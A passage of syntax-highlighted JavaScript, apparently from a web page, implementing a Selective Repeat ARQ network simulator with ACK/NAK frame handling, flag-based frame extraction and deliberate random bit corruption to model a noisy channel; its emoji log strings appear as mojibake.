class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.sim.para.winLen; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> fs = <span class="built_in">this</span>.frameSender[i];</span><br><span class="line">            <span class="keyword">if</span> (fs == <span class="literal">null</span> || fs.sequence != extractedFrame.sequence)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            fs.timeout = <span class="literal">null</span>;</span><br><span class="line">            fs.feedback = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (extractedFrame.data[<span class="number">0</span>] == <span class="number">0x01</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;    ğŸ‘®ğŸŸ¢Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; received ACK frame &quot;</span> + extractedFrame.sequence + <span class="string">&quot; from host &quot;</span> + extractedFrame.source);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ğŸ‘®â€ğŸŸ¢ Received ACK frame&quot;</span> + extractedFrame.sequence, <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                fs.status = FrameSenderStatus.Acked;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;    ğŸ‘®ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; received NAK frame &quot;</span> + extractedFrame.sequence + <span class="string">&quot; from host &quot;</span> + extractedFrame.source);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ğŸ‘®ğŸ”´ Received NAK frame &quot;</span> + extractedFrame.sequence, <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            fs.binIndex = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">HandleDataFrame</span>(<span class="params">extractedFrame</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Check if the frame is in the receive window</span></span><br><span class="line">        <span class="keyword">var</span> distance = <span class="built_in">Math</span>.min((<span class="built_in">this</span>.receiveWinSeq - extractedFrame.sequence + <span class="built_in">this</span>.sim.para.seq) % <span class="built_in">this</span>.sim.para.seq, (extractedFrame.sequence - <span class="built_in">this</span>.receiveWinSeq + <span class="built_in">this</span>.sim.para.seq) % <span class="built_in">this</span>.sim.para.seq);</span><br><span class="line">        <span class="keyword">if</span> (distance &gt;= <span class="built_in">this</span>.sim.para.winLen + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;âŒHost &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; received frame &quot;</span> + extractedFrame.sequence + <span class="string">&quot; from host &quot;</span> + extractedFrame.source + <span class="string">&quot; out of window&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Send ACK frame to the source</span></span><br><span class="line">        <span class="keyword">var</span> fbFrame = FrameHelper.MakeFrame(</span><br><span class="line">            extractedFrame.source,</span><br><span class="line">            <span class="built_in">this</span>.id,</span><br><span class="line">            extractedFrame.sequence,</span><br><span class="line">            [<span class="number">0x01</span>],</span><br><span class="line">            FrameType.Control,</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">this</span>.LoadFrameToSender(fbFrame);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Save the frame to the receive buffer</span></span><br><span class="line">        <span class="built_in">this</span>.PushToReceiveFrameBuffer(extractedFrame);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">HandleCorruptedFrame</span>(<span class="params">extractedFrame</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// check if the sender id is in the host list, if so, send NAK frame to the source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.sim.FindHostById(extractedFrame.source) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> fbFrame = FrameHelper.MakeFrame(</span><br><span class="line">                extractedFrame.source,</span><br><span class="line">                <span class="built_in">this</span>.id,</span><br><span class="line">                extractedFrame.sequence,</span><br><span class="line">                [<span class="number">0x00</span>],</span><br><span class="line">                FrameType.Control,</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">this</span>.LoadFrameToSender(fbFrame);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;&amp;nbsp;&amp;nbsp;âœ‹ğŸ» Sent NAK to &quot;</span> + extractedFrame.source + <span class="string">&quot; about frame &quot;</span> + extractedFrame.sequence, <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">            <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;&amp;nbsp;&amp;nbsp;âŒ Source info corrupted, dropped&quot;</span>, <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">ReceiveListener</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Listen to the receive bin buffer, extract frame and push to receive frame buffer</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if the first 8 bytes are a valid flag</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBuffer.length &gt;= <span class="number">8</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBuffer.slice(<span class="number">0</span>, <span class="number">8</span>).join(<span class="string">&quot;&quot;</span>) != <span class="string">&quot;01111110&quot;</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="comment">// If not, remove the first byte</span></span><br><span class="line">            <span class="built_in">this</span>.receiveBinBuffer.shift();</span><br><span class="line">            <span class="built_in">this</span>.processedBitCnt++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.receiveBinBuffer.length &lt; <span class="built_in">this</span>.sim.para.minFrLen)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if there is valid flag at the middle of the buffer</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBuffer.length &gt;= <span class="number">40</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBuffer.slice(<span class="number">1</span>, <span class="built_in">this</span>.receiveBinBuffer.length - <span class="number">1</span>).join(<span class="string">&quot;&quot;</span>).indexOf(<span class="string">&quot;01111110&quot;</span>) != -<span class="number">1</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="comment">// If yes, remove the bytes before the flag</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;â™Š Two or more flag in first &quot;</span> + <span class="built_in">this</span>.sim.para.minFrLen + <span class="string">&quot; bits&quot;</span>, <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> flagIndex = <span class="built_in">this</span>.receiveBinBuffer.slice(<span class="number">1</span>, <span class="built_in">this</span>.receiveBinBuffer.length - <span class="number">1</span>).join(<span class="string">&quot;&quot;</span>).indexOf(<span class="string">&quot;01111110&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.receiveBinBuffer = <span class="built_in">this</span>.receiveBinBuffer.slice(flagIndex);</span><br><span class="line">            <span class="built_in">this</span>.processedBitCnt += flagIndex;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if there is enough data to extract a frame</span></span><br><span class="line">        <span class="keyword">var</span> fFinder = FrameHelper.FrameFinder(<span class="built_in">this</span>.receiveBinBuffer, <span class="built_in">this</span>.sim.para.minFrLen);</span><br><span class="line">        <span class="keyword">if</span> (!fFinder)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> frame = fFinder.frame;</span><br><span class="line">        <span class="built_in">this</span>.receiveBinBuffer = <span class="built_in">this</span>.receiveBinBuffer.slice(fFinder.end);</span><br><span class="line">        <span class="built_in">this</span>.processedBitCnt += fFinder.end;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Extract the frame</span></span><br><span class="line">        <span class="keyword">if</span> (FrameHelper.CheckFrame(frame)) &#123; <span class="comment">// if the frame is valid</span></span><br><span class="line">            <span class="keyword">var</span> extractedFrame = FrameHelper.ExtractFrame(frame);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extractedFrame.destination != <span class="built_in">this</span>.id) &#123;</span><br><span class="line">                <span class="built_in">console</span>.warn(<span class="string">&quot;[DESTINATION] Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; received frame for host &quot;</span> + extractedFrame.destination);</span><br><span class="line">                <span class="built_in">console</span>.warn(<span class="string">&quot;[DESTINATION] frame: &quot;</span>, frame);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;ğŸ¤·â€â™‚ï¸ Not frame for this host, dropped&quot;</span>, <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extractedFrame.type == FrameType.Control) &#123;</span><br><span class="line">                <span class="comment">// If it&#x27;s a ACK or NAK frame, check frame sender and update the buffer</span></span><br><span class="line">                <span class="comment">// This also shows the host is the sender in this conversation</span></span><br><span class="line">                <span class="built_in">this</span>.HandleControlFrame(extractedFrame);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.HandleDataFrame(extractedFrame);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;ğŸ“§ Valid data frame &quot;</span> + extractedFrame.sequence + <span class="string">&quot; found, sent it to Frame Receive Buffer&quot;</span>, <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// if the frame is corrupted, try to extract and send NAK</span></span><br><span class="line">            <span class="built_in">console</span>.warn(<span class="string">&quot;[CORRUPTED] Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; received corrupted frame&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.warn(<span class="string">&quot;[CORRUPTED] frame: &quot;</span>, frame);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;â“ Corrupted frame received, trying to handle&quot;</span>, <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> extractedFrame = FrameHelper.ExtractFrame(frame, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extractedFrame.destination != <span class="built_in">this</span>.id) &#123;</span><br><span class="line">                <span class="built_in">console</span>.warn(<span class="string">&quot;[DESTINATION] Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; received frame for host &quot;</span> + extractedFrame.destination);</span><br><span class="line">                <span class="built_in">console</span>.warn(<span class="string">&quot;[DESTINATION] frame: &quot;</span>, frame);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;ğŸ¤·â€â™‚ï¸ Not frame for this host, dropped&quot;</span>, <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.HandleCorruptedFrame(extractedFrame);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">LoadFrameToSender</span>(<span class="params">frame</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> extractedFrame = FrameHelper.ExtractFrame(frame);</span><br><span class="line">        <span class="built_in">this</span>.frameSender.push(&#123;</span><br><span class="line">            frame: frame.slice(),</span><br><span class="line">            receiverID: extractedFrame.destination,</span><br><span class="line">            binIndex: <span class="number">0</span>,</span><br><span class="line">            sequence: extractedFrame.sequence,</span><br><span class="line">            feedback: <span class="literal">false</span>,</span><br><span class="line">            controlFrame: extractedFrame.type == FrameType.Control,</span><br><span class="line">            timeout: <span class="literal">null</span>, <span class="comment">// timeout = null means the frame is not sent yet</span></span><br><span class="line">            status: FrameSenderStatus.Queuing,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">SendListener</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Listen to the send frame buffer, send the frame to the destination using Selective Repeat ARQ protocol</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.frameSender.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// when not sending frame, check if there is any control frame, if so, make the first control frame found the top of the buffer</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.frameSender.length &amp;&amp; !<span class="built_in">this</span>.sendingFrame; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.frameSender[i].controlFrame == <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;ğŸ‘†ğŸ‘†ğŸ‘†Contorl frame has moved to the top of the buffer&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;ğŸ‘†ğŸ‘†ğŸ‘† Contorl frame has moved to the top of the buffer&quot;</span>, <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">this</span>.frameSender.unshift(<span class="built_in">this</span>.frameSender.splice(i, <span class="number">1</span>)[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (</span><br><span class="line">            <span class="built_in">this</span>.frameSender.length &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">this</span>.frameSender[<span class="number">0</span>].status == FrameSenderStatus.Acked</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;      ğŸš® Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; Removed frame &quot;</span> + <span class="built_in">this</span>.frameSender[<span class="number">0</span>].sequence + <span class="string">&quot; from sender buffer&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;ğŸ‘€ Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; Now the send window is at &quot;</span> + <span class="built_in">this</span>.frameSender[<span class="number">0</span>].sequence)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ğŸš® Removed frame &quot;</span> + <span class="built_in">this</span>.frameSender[<span class="number">0</span>].sequence, <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.frameSender.shift();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the frame that is being sending or frist frame waiting to be sent</span></span><br><span class="line">        <span class="keyword">var</span> currentFrameIndex = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.sim.para.winLen &amp;&amp; i &lt; <span class="built_in">this</span>.frameSender.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> currentFS = <span class="built_in">this</span>.frameSender[i];</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                currentFS.timeout == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (currentFS.feedback == <span class="literal">false</span> || currentFS.binIndex != currentFS.frame.length)</span><br><span class="line">            ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!currentFS.feedback) &#123;</span><br><span class="line">                    currentFrameIndex = i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.sendingFrame) &#123;</span><br><span class="line">                    currentFrameIndex = i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (currentFrameIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// When all frames in the window are sent</span></span><br><span class="line">            <span class="comment">// Check time out in the window range</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.sim.para.winLen &amp;&amp; i &lt; <span class="built_in">this</span>.frameSender.length; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> currentFS = <span class="built_in">this</span>.frameSender[i];</span><br><span class="line">                <span class="keyword">if</span> (currentFS.timeout != <span class="literal">null</span> &amp;&amp; (<span class="built_in">this</span>.tickCnt &gt; currentFS.timeout)) &#123;</span><br><span class="line">                    <span class="comment">// If time out, reset the frame and send it again</span></span><br><span class="line"></span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;â°Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; time out frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                    <span class="built_in">console</span>.log(currentFS.timeout)</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="built_in">this</span>.tickCnt)</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;â° Time out frame &quot;</span> + currentFS.sequence, <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    currentFS.status = FrameSenderStatus.Timeout;</span><br><span class="line">                    currentFS.binIndex = <span class="number">0</span>;</span><br><span class="line">                    currentFS.timeout = <span class="literal">null</span>;</span><br><span class="line">                    currentFrameIndex = i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (currentFrameIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.sendingFrame = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Send a bit of the frame to the destination</span></span><br><span class="line">        <span class="keyword">var</span> destination = <span class="built_in">this</span>.sim.FindHostById(<span class="built_in">this</span>.frameSender[currentFrameIndex].receiverID);</span><br><span class="line">        <span class="keyword">var</span> currentFS = <span class="built_in">this</span>.frameSender[currentFrameIndex];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the frameSenderInfo</span></span><br><span class="line">        <span class="keyword">if</span> (currentFS.binIndex != currentFS.frame.length) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentFS.binIndex == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.sendingFrame = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">var</span> frameContent = bytes2str(FrameHelper.ExtractFrame(currentFS.frame).data);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;ğŸ“¡Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; sending frame:  \&quot;&quot;</span> + frameContent + <span class="string">&quot;\&quot;  to host &quot;</span> + currentFS.receiverID + <span class="string">&quot; (sequence: &quot;</span> + currentFS.sequence);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ui) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.ui.LogInfo(<span class="string">&quot;ğŸ“¡ Sending frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;frameSenderBufferLog&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                currentFS.status = FrameSenderStatus.Sending;</span><br><span class="line">                currentFS.feedback = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            destination.receiveBinBuffer.push(currentFS.frame[currentFS.binIndex])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> destHost = <span class="built_in">this</span>.sim.hostList[<span class="built_in">this</span>.id == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>];</span><br><span class="line">            <span class="built_in">this</span>.sentBitCnt++;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ================================================================================</span></span><br><span class="line">            <span class="comment">// Mannually corrupting the bit randomly</span></span><br><span class="line">            <span class="comment">// ================================================================================</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">Math</span>.random() &lt; <span class="built_in">this</span>.sim.para.corRate) &#123;</span><br><span class="line">                destination.receiveBinBuffer[destination.receiveBinBuffer.length - <span class="number">1</span>] = <span class="number">1</span> - destination.receiveBinBuffer[destination.receiveBinBuffer.length - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Judge which part of the frame is corrupted</span></span><br><span class="line">                <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the header of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">9</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the type of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">11</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the destination of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">13</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the source of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">17</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the sequence of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; currentFS.frame.length - <span class="number">16</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the data of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; currentFS.frame.length - <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the checksum of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">console</span>.warn(<span class="string">&quot;ğŸ”´Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; corrupted the end of frame &quot;</span> + currentFS.sequence + <span class="string">&quot; to host &quot;</span> + currentFS.receiverID);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> anotherUI = <span class="built_in">this</span>.sim.hostList[<span class="built_in">this</span>.id == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>].ui;</span><br><span class="line">                <span class="keyword">if</span> (anotherUI) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; header &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">9</span>) &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; type &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">11</span>) &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; destination &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">13</span>) &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; source &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; <span class="number">17</span>) &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; sequence &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentFS.binIndex &lt; currentFS.frame.length - <span class="number">16</span>) &#123;</span><br><span class="line">                        anotherUI.LogInfo(<span class="string">&quot;ğŸ”´ Manually corrupted a bit &#123; data &#125; of frame &quot;</span> + currentFS.sequence + (currentFS.controlFrame ? <span class="string">&quot; (control frame)&quot;</span> : <span class="string">&quot;&quot;</span>), <span class="string">&quot;receiveBinBufferLog&quot;</span>);</span><br><span class="line">                    &#125; <span 